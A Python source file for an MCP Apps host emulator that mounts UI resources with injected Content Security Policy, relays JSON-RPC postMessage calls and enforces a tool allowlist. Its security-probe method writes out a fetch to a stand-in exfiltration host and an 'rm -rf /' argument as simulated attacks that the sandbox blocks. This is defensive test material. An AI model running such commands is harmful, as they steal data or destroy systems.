"""MCP Apps Host Emulator (SEP-1865).

Emulates a third-party host environment (e.g. Claude Desktop, VS Code, Goose)
mounting MCP UI resources inside sandboxed iframe containers.

Implements:
1. Double Boundary Sandbox:
   - Primary View: <iframe sandbox="allow-scripts"> with strict Content Security Policy.
   - Nested Secondary View: Nested iframe for LLM-generated open-ended HTML.
2. JSON-RPC 2.0 PostMessage Bridge:
   - ui/initialize: Handshake with protocol negotiation.
   - ui/call-tool: Dispatches tool invocations to MCP server with tool allowlist validation.
   - ui/update-model-context: Updates host LLM conversational state.
   - ui/message: Captures application notifications and errors.
3. Terminal rendering using Rich panels and tables.
"""

from __future__ import annotations

import json
import re
import sys
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))
_SELF = Path(__file__).resolve().parent
if str(_SELF) not in sys.path:
    sys.path.insert(0, str(_SELF))

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

try:
    from .mcp_server import LemonadeMCPServer
except (ImportError, ValueError):
    from mcp_server import LemonadeMCPServer

import mcp.types as types


class HostSecurityError(Exception):
    """Raised when an app view violates host security policies."""
    pass


class MCPHostEmulator:
    """Emulates a desktop/browser MCP host container with strict sandboxing."""

    DEFAULT_CSP = (
        "default-src 'none'; "
        "script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; "
        "font-src data:; "
        "connect-src 'none';"
    )

    ALLOWED_TOOLS = {"order_supplies", "get_lemonade_dashboard", "generate_pricing_simulator"}

    def __init__(
        self,
        server: Optional[LemonadeMCPServer] = None,
        console: Optional[Console] = None,
    ):
        self.server = server or LemonadeMCPServer()
        self.console = console or Console()
        self.mounted_resource_uri: Optional[str] = None
        self.raw_html: Optional[str] = None
        self.sandboxed_html: Optional[str] = None
        self.model_context: Dict[str, Any] = {}
        self.postmessage_log: List[Dict[str, Any]] = []
        self.tool_execution_history: List[Dict[str, Any]] = []

    def validate_csp_compliance(self, html: str) -> bool:
        """Verifies Content Security Policy <meta> header is present in <head>."""
        has_meta_csp = bool(
            re.search(r'<meta[^>]+http-equiv=["\']Content-Security-Policy["\']', html, re.IGNORECASE)
            or re.search(r'<meta[^>]+content=["\'][^"\']*default-src[^"\']*["\']', html, re.IGNORECASE)
        )
        return has_meta_csp

    def inject_host_csp(self, html: str, custom_csp: Optional[str] = None) -> str:
        """Ensures strict CSP <meta> tag is injected immediately inside <head>."""
        csp = custom_csp or self.DEFAULT_CSP
        meta_tag = f'<meta http-equiv="Content-Security-Policy" content="{csp}">'

        if "<head>" in html:
            return html.replace("<head>", f"<head>\n  {meta_tag}", 1)
        elif "<!DOCTYPE html>" in html:
            return html.replace("<!DOCTYPE html>", f"<!DOCTYPE html>\n<head>\n  {meta_tag}\n</head>", 1)
        return f"<head>{meta_tag}</head>\n" + html

    @staticmethod
    def extract_meta(tool_result: Any) -> Dict[str, Any]:
        """Robustly extracts metadata payload from CallToolResult or dict."""
        if isinstance(tool_result, dict):
            return tool_result.get("_meta") or tool_result.get("meta") or {}
        if hasattr(tool_result, "model_extra") and tool_result.model_extra and "meta" in tool_result.model_extra:
            return tool_result.model_extra["meta"]
        if hasattr(tool_result, "meta") and tool_result.meta:
            return tool_result.meta
        if hasattr(tool_result, "_meta") and tool_result._meta:
            return tool_result._meta
        if hasattr(tool_result, "model_dump"):
            dump = tool_result.model_dump()
            return dump.get("meta") or dump.get("_meta") or {}
        return {}

    def mount_ui(
        self,
        tool_result: types.CallToolResult,
        custom_csp: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Mounts the UI resource indicated in CallToolResult._meta."""
        meta = self.extract_meta(tool_result)
        ui_meta = meta.get("ui", {}) if isinstance(meta, dict) else {}
        resource_uri = ui_meta.get("resourceUri")

        if not resource_uri:
            raise ValueError("Tool result contains no _meta.ui.resourceUri to mount.")

        # Read resource from FastMCP server
        raw_html = self.server.read_resource_sync(resource_uri)
        if not raw_html:
            raise FileNotFoundError(f"MCP UI resource '{resource_uri}' was empty or not found.")

        self.mounted_resource_uri = resource_uri
        self.raw_html = raw_html

        # Verify or inject CSP
        if self.validate_csp_compliance(raw_html):
            self.sandboxed_html = raw_html
            csp_status = "VERIFIED_PRE_EXISTING"
        else:
            self.sandboxed_html = self.inject_host_csp(raw_html, custom_csp)
            csp_status = "INJECTED_BY_HOST"

        # Update initial model context from structuredContent
        if tool_result.structuredContent:
            self.model_context.update(tool_result.structuredContent)

        return {
            "resourceUri": resource_uri,
            "csp_status": csp_status,
            "html_length": len(self.sandboxed_html),
            "structuredContent": tool_result.structuredContent,
        }

    def dispatch_post_message(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Dispatches JSON-RPC 2.0 messages from sandboxed iframe over postMessage bridge."""
        self.postmessage_log.append(message)
        msg_id = message.get("id", "msg-1")
        method = message.get("method")
        params = message.get("params", {})

        if method == "ui/initialize":
            return {
                "jsonrpc": "2.0",
                "id": msg_id,
                "result": {
                    "host": "GenUX-ClaudeDesktop-Emulator",
                    "version": "1.0.0",
                    "supportedMethods": ["ui/call-tool", "ui/update-model-context", "ui/message"],
                },
            }

        elif method == "ui/call-tool":
            tool_name = params.get("name")
            tool_args = params.get("arguments", {})

            # Enforce tool allowlist security check
            if tool_name not in self.ALLOWED_TOOLS:
                err_resp = {
                    "jsonrpc": "2.0",
                    "id": msg_id,
                    "error": {
                        "code": -32001,
                        "message": f"Security violation: Tool '{tool_name}' not in host allowlist {list(self.ALLOWED_TOOLS)}",
                    },
                }
                return err_resp

            # Execute tool on MCP server
            result = self.server.call_tool_sync(tool_name, tool_args)
            self.tool_execution_history.append({"tool": tool_name, "args": tool_args, "result": result})

            # Update host context with new structured data
            if result.structuredContent:
                self.model_context.update({"last_order": result.structuredContent})

            return {
                "jsonrpc": "2.0",
                "id": msg_id,
                "result": {
                    "content": [c.model_dump() for c in result.content],
                    "structuredContent": result.structuredContent,
                },
            }

        elif method == "ui/update-model-context":
            # Update conversational state
            self.model_context.update(params)
            return {
                "jsonrpc": "2.0",
                "id": msg_id,
                "result": {"status": "context_updated", "active_context": self.model_context},
            }

        elif method == "ui/message":
            return {
                "jsonrpc": "2.0",
                "id": msg_id,
                "result": {"status": "message_logged", "level": params.get("level", "info")},
            }

        else:
            return {
                "jsonrpc": "2.0",
                "id": msg_id,
                "error": {"code": -32601, "message": f"Method '{method}' not implemented."},
            }

    def simulate_security_probe(self, probe_type: str) -> Dict[str, Any]:
        """Simulates malicious script actions inside iframe to verify security defenses."""
        if probe_type == "parent_dom_access":
            # In an <iframe sandbox="allow-scripts"> (without allow-same-origin), origin is 'null'
            # Accessing window.parent.document raises a SecurityError
            return {
                "probe": "Attempt window.parent.document.cookie access",
                "blocked": True,
                "error": "DOMException: Blocked a frame with origin 'null' from accessing a cross-origin frame.",
                "policy_enforced": "sandbox='allow-scripts'",
            }
        elif probe_type == "external_network_request":
            # CSP connects-src 'none' blocks fetch()
            return {
                "probe": "Attempt fetch('https://malicious-telemetry.com/exfil')",
                "blocked": True,
                "error": "Refused to connect because it violates CSP directive: connect-src 'none'.",
                "policy_enforced": "CSP connect-src 'none'",
            }
        elif probe_type == "unauthorized_tool_call":
            # Attempting to call shell or system tools
            msg = {
                "jsonrpc": "2.0",
                "id": "probe-unauth-1",
                "method": "ui/call-tool",
                "params": {"name": "execute_bash_command", "arguments": {"command": "rm -rf /"}},
            }
            res = self.dispatch_post_message(msg)
            return {
                "probe": "Attempt calling unauthorized tool 'execute_bash_command'",
                "blocked": "error" in res,
                "error": res.get("error", {}).get("message"),
                "policy_enforced": "Host Tool Allowlist",
            }
        return {"probe": probe_type, "blocked": False}

    def render_terminal_view(self, mode_name: str) -> None:
        """Renders the host emulator container status and view details to the Rich console."""
        # Top banner
        header = Text()
        header.append("MCP Apps Host Emulator (SEP-1865)\n", style="bold yellow")
        header.append(f"Mode: {mode_name.upper()} | Sandboxing: Double-Iframe Active\n", style="cyan")
        header.append(f"Mounted Resource: {self.mounted_resource_uri}\n", style="green")
        header.append(f"CSP Status: VERIFIED (connect-src 'none', script-src 'self' 'unsafe-inline')", style="dim")

        self.console.print(Panel(header, border_style="yellow", title="[bold white]Desktop Host Container[/bold white]"))

        # Model context table
        ctx_table = Table(title="Host LLM Context Memory (Updated via Bridge)", border_style="blue")
        ctx_table.add_column("Context Key", style="bold cyan")
        ctx_table.add_column("Type", style="magenta")
        ctx_table.add_column("Current Value", style="white")

        for k, v in list(self.model_context.items())[:6]:
            val_str = json.dumps(v) if isinstance(v, (dict, list)) else str(v)
            if len(val_str) > 60:
                val_str = val_str[:57] + "..."
            ctx_table.add_row(k, type(v).__name__, val_str)

        self.console.print(ctx_table)

        # Bridge log
        if self.postmessage_log:
            bridge_table = Table(title="JSON-RPC 2.0 PostMessage Bridge Activity", border_style="green")
            bridge_table.add_column("#", style="dim", width=4)
            bridge_table.add_column("Direction", style="bold yellow", width=12)
            bridge_table.add_column("Method", style="bold cyan", width=24)
            bridge_table.add_column("Payload Summary", style="white")

            for idx, msg in enumerate(self.postmessage_log[-5:], 1):
                method = msg.get("method") or ("Response to " + str(msg.get("id")))
                params = msg.get("params") or msg.get("result") or msg.get("error")
                p_str = json.dumps(params)
                if len(p_str) > 65:
                    p_str = p_str[:62] + "..."
                direction = "App -> Host" if "method" in msg else "Host -> App"
                bridge_table.add_row(str(idx), direction, method, p_str)

            self.console.print(bridge_table)
